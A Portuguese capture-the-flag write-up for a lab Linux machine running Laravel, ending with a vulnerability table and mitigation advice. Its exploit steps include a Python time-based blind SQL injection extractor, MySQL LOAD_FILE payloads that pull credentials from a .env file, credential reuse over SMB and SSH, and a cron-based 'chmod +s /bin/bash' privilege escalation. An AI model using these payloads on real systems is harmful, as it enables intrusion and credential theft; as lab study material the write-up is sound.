# 🎯 Writeup — Máquina Laravel-Time

> **Dificuldade:** Médio | **SO:** Linux | **Tags:** `SQLi Time-Based` · `LOAD_FILE` · `SMB` · `Crontab PrivEsc`

---

## 1. Sumário Executivo

O comprometimento total foi alcançado através de uma cadeia de exploração que começou com uma vulnerabilidade crítica de **SQL Injection Time-Based Blind** no formulário de login de uma aplicação Laravel. Através de automação com busca binária e a função `LOAD_FILE()` do MySQL, foi possível extrair o conteúdo do arquivo `.env` sem acionar alertas, obtendo credenciais em texto plano. O reuso dessas credenciais nos serviços de infraestrutura (SMB e SSH) possibilitou acesso remoto ao servidor. Por fim, a presença de um arquivo editável pelo grupo da aplicação, executado periodicamente pelo agendador do sistema (`cron`) com privilégios de `root`, permitiu a escalação total de privilégios.

---

## 2. Reconhecimento

### 2.1 Scan de Portas

```bash
nmap -p- -T4 --min-rate 1000 172.16.10.54
```

**Resultado:**

| Porta | Serviço |
|-------|---------|
| 22    | SSH     |
| 80    | HTTP (Laravel) |
| 111   | rpcbind |
| 139   | NetBIOS-SSN (SMB) |
| 445   | Microsoft-DS (SMB) |
| 3306  | MySQL (acesso externo bloqueado) |

### 2.2 Enumeração SMB (Pré-autenticação)

```bash
smbclient -L //172.16.10.54 -N
```

```
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (Samba 4.10.16)
```

> ⚠️ Login anônimo habilitado — uma das permissões SMB inseguras identificadas no alvo.

---

## 3. Exploração Web — SQL Injection Time-Based Blind

### 3.1 Identificação do Ponto de Injeção

A aplicação possuía um formulário de login em `POST /` com o parâmetro `username` vulnerável a SQLi. A detecção foi confirmada com um payload de timing:

```sql
' OR IF(1=1, SLEEP(2), 0)-- -
```

O servidor demorou **~2 segundos** a mais do que o normal para responder, confirmando a injeção.

**Particularidade:** A aplicação Laravel usa um token CSRF (`_token`) que precisa ser extraído via GET na página de login antes de cada requisição POST.

### 3.2 Técnica de Extração — Busca Binária

Em vez da extração linear (48 requests/char), foi implementada **busca binária sobre o valor ASCII** de cada caractere, reduzindo para **~7 requests/char**.

```python
# Lógica central do extrator binário
def inject(payload):
    token = get_token()
    data = {'_token': token, 'username': payload, 'password': 'test'}
    start = time.time()
    try:
        requests.post(TARGET, data=data, timeout=DELAY+8)
    except:
        return True
    return (time.time() - start) >= (DELAY - 0.3)

# Para cada posição:
low, high = 32, 126
while low <= high:
    mid = (low + high) // 2
    p = f"' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE name='time'), {pos}, 1)) > {mid}, SLEEP({DELAY}), 0)-- -"
    if inject(p):
        low = mid + 1
    else:
        high = mid - 1
result += chr(low)
```

### 3.3 Extração do Hash do Usuário `time`

A estrutura da tabela `users` foi identificada com as colunas `name` e `password`. O hash bcrypt do usuário `time` foi extraído:

```
$2y$10$XUgKsX0OQ0tPo3cG38Mmqep8sdM9MmjWHH2XuXosXcrBrjSyNRFHK
```

> **Análise:** Hash bcrypt (`$2y$10$`) — algoritmo lento por design, inviável de crackar em tempo razoável sem GPU dedicada ou senha trivial. O foco migrou para a extração do `.env`.

### 3.4 Extração do Arquivo `.env` via `LOAD_FILE()`

O MySQL tinha privilégio `FILE` ativo, permitindo leitura de arquivos do servidor via:

```sql
LOAD_FILE('/var/www/html/.env')
```

**Problema:** `INTO OUTFILE` estava bloqueado (`secure_file_priv` ativo), então não foi possível escrever o arquivo num local acessível via HTTP. A extração teve que ser feita caractere por caractere via time-based.

**Otimização — Busca com `LOCATE()`:**

Em vez de extrair o arquivo inteiro (centenas de linhas), foi usada a função `LOCATE()` do MySQL para **pular direto para a posição** de palavras-chave como `PASSWORD` e `time`, extraindo apenas o contexto relevante:

```sql
-- Encontrar a posição exata de 'MAIL_PASSWORD=' no arquivo
LOCATE('MAIL_PASSWORD=', LOAD_FILE('/var/www/html/.env'))

-- Extrair os N caracteres seguintes (o valor da senha)
SUBSTRING(LOAD_FILE('/var/www/html/.env'),
    LOCATE('MAIL_PASSWORD=', LOAD_FILE('/var/www/html/.env')) + LENGTH('MAIL_PASSWORD=') + {pos} - 1,
    1)
```

**Resultado da extração do `.env` (campos relevantes):**

```env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:UFybaJzpqnPdP5NbpQHCG0gac/wg0lEJIAATJr99Fho=
APP_DEBUG=false
APP_URL=http://...

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=...
DB_PASSWORD=           ← vazio

REDIS_PASSWORD=null

MAIL_USERNAME=time     ← usuário encontrado aqui!
MAIL_PASSWORD=Sup3rM@n.2   ← senha extraída!
```

> 🔑 **Credencial descoberta:** `time` / `Sup3rM@n.2`
> 
> **Falha crítica:** Reuso da senha de e-mail como senha de sistema/SMB.

---

## 4. Acesso e Movimentação Lateral

### 4.1 Validação no SMB (Porta 445)

```bash
nxc smb 172.16.10.54 -u 'time' -p 'Sup3rM@n.2' --shares
```

```
SMB  172.16.10.54  445  IP-172-16-10-54  [+] time:Sup3rM@n.2
SMB  172.16.10.54  445  IP-172-16-10-54  [+] Shares:
      time$    READ,WRITE   Home do usuário
```

> Acesso com permissão de **READ/WRITE** no diretório home do usuário `time`.

### 4.2 Acesso SSH (Porta 22)

```bash
ssh time@172.16.10.54
# Senha: Sup3rM@n.2
```

**Flag de Usuário:**

```
uhc{SQL_1nj3ct10n_l1k3_4_b0ss}
```

---

## 5. Escalação de Privilégios (PrivEsc) — Artisan Hijacking via Crontab

### 5.1 Enumeração

Após ganhar acesso inicial como `time` (ou `apache` via reverse shell), foi identificado:

```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

O arquivo `app/Console/Commands/Time.php` era **editável pelo grupo da aplicação** — um comando customizado do Laravel chamado pelo agendador.

### 5.2 Análise do Cron

```bash
cat /etc/crontab
# ou verificar scripts em /etc/update-motd.d/
```

Foi identificado que o **Laravel Scheduler** (`php artisan schedule:run`) era executado periodicamente via `cron` com privilégios de `root`, como parte dos scripts de MOTD do sistema.

### 5.3 Injeção do Payload

O arquivo `Time.php` foi modificado para injetar código malicioso no método `handle()`:

```php
public function handle()
{
    shell_exec("chmod +s /bin/bash");
}
```

### 5.4 Gatilho e Exploração

Após a próxima execução do cron (aguardar ~1 minuto):

```bash
# Verificar se o SUID foi aplicado
ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash

# Obter shell de root
/bin/bash -p
whoami
# root
```

**Flag de Root:** Obtida em `/root/root.txt`.

---

## 6. Diagrama da Cadeia de Ataque

```
[Formulário de Login]
        │
        ▼
 SQLi Time-Based Blind
 (parâmetro username)
        │
        ├─► Extração do hash bcrypt (users)
        │       └─► $2y$10$XUgKsX0...RFHK (não crackado)
        │
        └─► LOAD_FILE('/var/www/html/.env')
                │
                └─► MAIL_PASSWORD=Sup3rM@n.2
                         │
                         ├─► SMB (port 445) ✅ READ/WRITE
                         │
                         └─► SSH (port 22) ✅
                                  │
                                  └─► Flag usuário
                                  │
                                  └─► Time.php (writable)
                                           │
                                           └─► Cron (root) → chmod +s /bin/bash
                                                    │
                                                    └─► /bin/bash -p → ROOT ✅
```

---

## 7. Credenciais e Flags

| Item | Valor |
|------|-------|
| **Usuário** | `time` |
| **Senha** | `Sup3rM@n.2` |
| **Flag Usuário** | `uhc{SQL_1nj3ct10n_l1k3_4_b0ss}` |
| **Flag Root** | (obtida em `/root/root.txt`) |

---

## 8. Vulnerabilidades Identificadas

| # | Vulnerabilidade | Severidade | CVE/CWE |
|---|-----------------|------------|---------|
| 1 | SQL Injection Time-Based Blind | 🔴 Crítico | CWE-89 |
| 2 | MySQL `FILE` privilege habilitado (`LOAD_FILE`) | 🔴 Crítico | CWE-732 |
| 3 | Arquivo `.env` com credenciais em texto plano legíveis via SQLi | 🔴 Crítico | CWE-312 |
| 4 | Reuso de senha entre serviços (mail → sistema) | 🟠 Alto | CWE-521 |
| 5 | Permissão de escrita em arquivo executado pelo cron como root | 🔴 Crítico | CWE-732 |
| 6 | SMB com permissão de escrita no home do usuário | 🟠 Alto | CWE-284 |
| 7 | Login anônimo SMB habilitado | 🟡 Médio | CWE-306 |

---

## 9. Ferramentas Utilizadas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Scan de portas/serviços |
| `smbclient` / `smbmap` / `nxc` | Enumeração e autenticação SMB |
| Python (`requests`) | Script customizado de SQLi time-based |
| MySQL `LOCATE()` + `LOAD_FILE()` | Extração otimizada do `.env` |
| `john` | Tentativa de crack do hash bcrypt |
| `ssh` | Acesso remoto pós-exploração |

---

## 10. Recomendações de Mitigação

1. **SQLi:** Usar Prepared Statements / Query Builders com bind de parâmetros. Nunca concatenar input do usuário em queries SQL.
2. **MySQL FILE privilege:** Revogar o privilégio `FILE` do usuário do banco: `REVOKE FILE ON *.* FROM 'laravel'@'localhost';`
3. **`secure_file_priv`:** Configurar `secure_file_priv = ""` → `secure_file_priv = "/tmp"` para limitar o `LOAD_FILE`.
4. **Arquivo `.env`:** Garantir que o webserver não sirva o `.env` (`deny from all` ou bloqueio no nginx/apache). Não armazenar senhas em texto plano quando possível.
5. **Reutilização de senha:** Implementar política de senhas únicas por serviço.
6. **Permissões de arquivo:** Auditar arquivos executados pelo cron com permissões de escrita por grupos não-privilegiados.
7. **SMB:** Desabilitar acesso anônimo, restringir permissões de escrita ao diretório home.
